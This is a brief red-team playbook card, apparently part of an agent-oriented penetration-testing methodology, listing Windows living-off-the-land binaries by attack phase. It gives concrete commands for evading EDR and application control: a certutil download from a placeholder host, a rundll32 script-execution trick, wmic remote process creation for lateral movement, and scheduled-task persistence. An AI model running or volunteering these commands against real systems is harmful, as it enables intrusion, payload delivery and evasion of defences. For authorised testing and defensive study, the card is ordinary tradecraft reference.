# Internal Network, Host, And Identity Operations: LOLBin & Living Off The Land

> Apply [../module-continuity.md](../module-continuity.md). Inherit the engagement, parent path, current capability, evidence, authorization profile, and module stack. Do not initialize a separate workflow. Checkpoint material results and return them to the parent path before leaving this card.

## LOLBin & Living Off The Land

When EDR is present, prefer native Windows binaries over custom tools. Key LOLBins for each phase:

| Phase | LOLBin | Example |
|---|---|---|
| **Enumeration** | `net`, `nltest`, `dsquery`, `reg`, `wmic`, `powershell -c` | `dsquery user -name *` to list all AD users |
| **Download** | `certutil`, `bitsadmin`, `mshta`, `msiexec` | `certutil -urlcache -f http://x/a.exe a.exe` |
| **Execution** | `mshta`, `rundll32`, `regsvr32`, `cscript`/`wscript`, `msbuild` | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(1)` |
| **Persistence** | `schtasks`, `reg`, `wmic event filter`, `bitsadmin` (persistent job) | Scheduled task with hidden attribute |
| **Recon** | `nslookup`, `netstat`, `tasklist`, `sc`, `driverquery` | `sc query type=driver` |
| **Lateral** | `wmic`, `schtasks`, `powershell remoting`, `winrs` | `wmic /node:<target> process call create "cmd /c ..."` |

**When to prefer LOLBins**: EDR in enforcement mode, AppLocker/WDAC restricting unknown binaries, tight egress filtering, or when the engagement objective explicitly includes control evasion.

---


## Card Exit

Classify the result, update evidence and attempted methods, record capability or risk changes, identify affected paths, and apply the return contract in [../module-continuity.md](../module-continuity.md).
